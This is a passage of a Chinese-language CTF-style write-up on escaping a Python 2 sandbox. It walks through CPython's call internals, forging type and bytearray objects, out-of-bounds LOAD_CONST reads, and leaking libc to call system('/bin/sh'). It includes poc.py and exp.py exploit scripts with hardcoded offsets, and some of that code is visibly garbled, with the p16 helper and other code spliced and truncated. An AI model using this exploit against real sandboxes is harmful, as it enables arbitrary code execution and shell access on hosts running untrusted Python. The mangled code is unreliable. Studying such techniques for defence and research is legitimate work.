    do_call(PyObject *func, PyObject ***pp_stack, int na, int nk)
    {
      if (nk > 0) {
       [...]
     if (kwdict == NULL)
     goto call_fail;
     }
    callargs = load_args(pp_stack, na);
    if (callargs == NULL)
    goto call_fail;
     if (PyCFunction_Check(func)) {
     [...]
     }
     else
    result = PyObject_Call(func, callargs, kwdict); /* 找到地方了 */
    call_fail:
    [...]
    }
总结一下需要调用到函数指针的过程：
i.字节码类型是CALL_FUNCTION，进入call_function；
ii.call_function中，PyCFunction_Check或者nk==0不成立，之后PyMethod_Check或者PyMethod_GET_SELF(func)
!= NULL不成立，然后PyFunction_Check不成立，进入do_call；
iii.do_call中PyCFunction_Check不成立，进入PyOBject_Call；
iv.PyObject_call中，func的ob_type的tp_call就是我们要调用的函数指针。
看代码有点烦，通俗地讲：
i.字节码是CALL_FUNCTION；
ii.不是function类型也不是method类型，不过是object类型；
iii.这个object类型的type object里的tp_call就是调用的函数指针。
这么看就简单多了，type object虽然是一开始静态分配的，但是反正又不检查，不是静态分配又如何？伪造一个嘛。
2)最终思路
i.构造一个object，构造为type object的形式，不过tp_call指向想要执行的位置；
ii.构造第二个object，使得type指向第一个object；
iii.构造第三个object，指针指向第二个object；
iv.构造字节码：1.通过extended_arg构造offset参数，offset为consts和第三个object的偏移，2.通过load_const指令，由于按照consts是tuple，会再解一次引用，于是使得第二个object被push进栈，3.通过call_function，进入调用过程；
v.将字节码设置进入某个function的func_code；
vi.执行这个function，即执行我们构造好的func_code。
3)poc.py
    import types
    from opcode import opmap
    import struct
    def p16(content):
    return struct.pack("> 16) +
    load_const +
    p16(offset & 0xffff) +
    call_function +
    p16(0),
    consts
    )
    #raw_input()
    code()
这个poc稍微显得有点乱，但是基本能够表达清楚思路。主要是有一些偏移量的计算不太好算，所以我采用了动态调试的方法，直接看内存结构，然后相减得到的偏移，看起来虽然乱了，但是却是计算偏移最简单的方法，偏移量其实很多时候不是很好静态计算，可能有一些你没想到的细节，如果动态去调着看的话，就一定是正确的偏移了。
运行这个POC，我们可以使rip指向0xdeadbeef了。
3.从POC到EXP，任意执行到shell
其实到这，剩下的步骤虽然还有一些，但是思路上已经全部清晰了，我们可以执行任意代码，现在需要的是：
i.找到system的地址；
ii.传入参数。
1)任意读
根据之前的讨论，我们知道了我们可以随意更改字节码，执行任意字节码，那么想要构造一个新的object也不是难事。想要读取信息，就需要一个指针，而Python有指针的地方实在是太多了。
我们采取的方法是使用ByteArrayObject，ByteArrayObject代码如下：
    typedef struct {
    PyObject_VAR_HEAD
     /* XXX(nnorwitz): should ob_exports be Py_ssize_t? */
     int ob_exports; /* how many buffer exports */
    Py_ssize_t ob_alloc; /* How many bytes allocated */
     char *ob_bytes; /* 重点！一个可以读的指针 */
    } PyByteArrayObject;
所以，想要任意读，伪造一个BYteArrayObject，伪造方法和之前一样，然后直接读就可以了，好了，现在的问题只剩下，读哪儿？
2)system地址
想要找到system的地址，就需要libc地址，libc地址其实还花了我一些时间，不过最终用到一个方法：
sys.stdin的f_fp字段存有_IO_2_1_stdin的地址，这个地址是位于libc
data段的，可以利用这个去拿到libc地址，最终拿到system地址，读取方法就根据上一节的PyByteArrayObject的方法就可以。
3)参数
有了system，可以劫持rip，最后的问题是传入参数。这里就需要注意到之前call的调用方式了：
    result = (*call)(callable, args, kwargs); /* func是第一个参数 */
func是一个指针，指向我们构造的“第一个对象”，所以，我们只需要把第一个对象的开始部分设置为"/bin/sh"，由于ob_next并没有用到，所以改为字符串并不会影响其他结果，最后就可以system("/bin/sh")了。
4.exp.py
这个exploit是我自己的环境下的，并且是自己编译的debug版本，执行不正常是可能出现的，因为偏移量不一样，甚至具体代码都有可能有一些不一样，所以仅供参考。最后还是需要自己手动调试才行（特别是各种偏移量）。
    import types
    import sys
    from opcode import opmap
    import struct
    def p16(content):
          return struct.pack("> 16) +
            load_const +
            p16(offset & 0xffff) +
            call_function +
            p16(0),
            consts
        )
        #raw_input()
        code()
    def pwn(addr):
        """
        leak the content of the address and call system('/bin/sh;')
        """
        consts = (12345, )
        to_be_next = bytearray("111")
        next_ptr = id(to_be_next) 
        bytearray_type_ptr = int(to_be_next.__subclasshook__.__str__().split('at ')[1][:-1], 16)
        #print("byte array type:{}".format(hex(bytearray_type_ptr)))
        # _ob_next _ob_prev ref cnt ob_type
        fake_bytearray = 'a' * 4 + p64(next_ptr) + p64(next_ptr) + p64(1) + p64(bytearray_type_ptr)
        # size ob_exports junk ob_alloc ob_bytes
        fake_bytearray += p64(0x20) + p32(1) + 'aaaa' + p64(20) + p64(addr)
        to_load = 'aaaa' + p64(id(fake_bytearray) + (0x310 - 0x2e0) + 8) + p64(1) + p64(1)
        ptr_fake_object = id(to_load) + (0x310 - 0x2e0)
        #print("fake byte array:{}".format(hex(ptr_fake_object)))
        ptr_consts = id(consts) + 32
        offset = ((ptr_fake_object - ptr_consts) // 8) & 0xffffffff
        #print("ptr consts:{} offset:{}".format(hex(ptr_consts), hex(offset)))
        def someleak():
            pass
        get_fake_bytearray_function = get_code(
            someleak,
            extended_arg + p16(offset >> 16) +
            load_const + p16(offset & 0xffff) +
            return_value,
            consts
        )
        #raw_input()
        fake_bytearray_object = get_fake_bytearray_function()
        #print("fake byte array object:{}".format(hex(id(fake_bytearray_object))))
        _IO_2_1_stdin_addr_list = []
        for i in range(8):
            _IO_2_1_stdin_addr_list.append(fake_bytearray_object[i])
        _IO_2_1_stdin_addr = u64(''.join(map(chr, _IO_2_1_stdin_addr_list)))[0]
        #print(_IO_2_1_stdin_addr)
        #print("addr:{}".format(hex(_IO_2_1_stdin_addr)))
        libc_base = _IO_2_1_stdin_addr - 0x39f8a0
        system_addr = libc_base + 0x40db0
        call(system_addr)
    if __name__ == "__main__":
        pwn(id(sys.stdin) + 0x20)
**结论**
1.Python真的没有沙箱，本文提出的方法几乎适合于任何情况的Python沙箱，除非有大更改。毕竟整个过程中用的都是Python必须的东西，原生的东西，没有依赖不必要的。
2.调试过程中尽量动态去算偏移，除非是真的必须要静态来看出原理。静态看偏移经常会出错。
**注意**
1.本文的情况和TCTF
final的情况不完全一样，他的情况还有一些地方需要处理。比如没有id函数可以拿到任意对象的地址，并且开启了PIE。本文中的情况考虑了PIE，但是id函数需要自己处理一下。我目前想到的id的处理方式，是通过一个方法，比如a
= ""; a.ljust.__str__()也是可以达到id函数的效果的，其他类型也可以相应的去找他有的方法来leak出地址。
2.本文的情况都是基于debug版本的，release版本应该会有一些小差别，但是方法是通用的，不过由于时间关系我没有再调试一遍release版本，release版本调试起来也会比较费时间，方法是能用的。